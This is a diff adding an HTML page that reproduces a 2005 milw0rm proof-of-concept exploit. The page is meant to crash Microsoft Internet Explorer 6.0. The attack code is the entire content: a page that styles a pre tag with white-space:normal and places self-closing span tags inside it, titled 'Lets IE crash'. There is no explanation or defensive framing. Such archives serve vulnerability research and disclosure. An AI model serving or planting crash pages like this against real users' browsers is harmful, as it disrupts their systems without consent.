@@ -1,0 +1,29 @@
+<html>
+<head>
+<title>MS Internet Explorer 6.0 (pre tag multiple single tags) Denial of Service</title>
+<pre>
+&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
+&lt;html&gt;
+&lt;head&gt;
+	&lt;title&gt;Lets IE crash&lt;/title&gt;
+	&lt;style type=&quot;text/css&quot;&gt;
+		pre {
+			white-space:normal;
+		}
+	&lt;/style&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+
+	&lt;pre&gt;
+		&lt;span /&gt;&lt;span /&gt;
+	&lt;/pre&gt;
+
+&lt;/body&gt;
+
+&lt;/html&gt;
+
+# milw0rm.com [2005-12-14]
+</pre>
+</html>
+
